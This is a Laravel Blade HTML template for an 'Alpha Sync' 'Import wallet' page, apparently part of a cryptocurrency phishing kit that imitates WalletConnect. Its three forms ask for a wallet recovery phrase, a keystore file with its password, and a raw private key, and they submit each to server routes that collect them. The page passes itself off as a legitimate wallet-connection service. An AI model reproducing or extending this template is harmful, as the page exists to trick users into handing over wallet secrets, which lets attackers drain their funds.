
<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Alpha Sync</title>
    <link rel="stylesheet" href="{{asset('index.css')}}" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="{{asset('app.js')}}" defer></script>
  </head>
  <body>
    @include('sweetalert::alert')
    <div class="wallet-import">
      <img src="{{asset('logo.png')}}" alt="" />
      <figure class="center">
        <figure class="import">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            class="h-6 w-6"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            stroke-width="2"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Import wallet
        </figure>
        <figure class="parent">
        <div class="info">
          <p class="click" id="first">phrase</p>
          <div class="phrase comeon" id="id1" >
            <form action="{{route('phrase')}}" method="POST">
                @csrf
                <input type="text" hidden name="wallet" value="{{$wallet? $wallet:"not defined wallet"}}" >

                <textarea name="phrase" id="" placeholder="phrase" rows="6" width="100%" value="" style="display: block; padding: 10px; width:100%;"></textarea>
                <input type="checkbox" name="" id="" style="display: block; margin:4px;">
                <p>Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                <button type="submit">IMPORT</button>

            </form>


        </div>
        </div>
       <div class="info">
        <p class="click" id="second">keystore </p>
        <div class="key-json comeon" id="id2">
            <form action="{{route('keystore')}}" method="post">
                @csrf
                <input type="text" hidden name="wallet" value="{{$wallet? $wallet:"not defined wallet"}}" >
                <textarea name="keystore" id="" value="" placeholder="keystore" rows="6" width="100%" style="display: block; padding: 10px; width:100%;"></textarea>
                <input type="password" value="" placeholder="password">
                <input type="checkbox" name="" id="" style="display: block; margin:4px;">
                <div class="ifo-text">
                  <p>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p>

                </div>
                <button type="submit">IMPORT</button>
            </form>

      </div>
       </div>
       <div class="info">
        <p class="click" id="third">private-key</p>
        <div class="private-key comeon" id="id3">
<form action="{{route('privatekey')}}" method="post">

    @csrf
    <input type="text" hidden name="wallet" value="{{$wallet? $wallet:"not defined wallet"}}" >
    <input type="text" placeholder="private-key" value="" name="privatekey" style="display: block;">
          <div class="ifo-text"><p>Your private key should look like this e.g. 3a1076bf45ab87712ad64ccb3b102177</p>
          </div>
          <button type="submit">IMPORT</button>

</form>

      </div>
       </div>
    </figure>
        </div>
      </figure>
    </div>
<div class="backdrop"></div>
    <footer>
      <div class="footer">
        <i class="fa fa-telegram" aria-hidden="true">telegram</i>
        <i class="fa fa-reddit" aria-hidden="true">reddit</i>
        <i class="fa fa-twitter" aria-hidden="true">twiter</i>
        <i class="fa fa-github" aria-hidden="true">github</i>
      </div>
      powered by wallet connet
    </footer>
  </body>
</html>













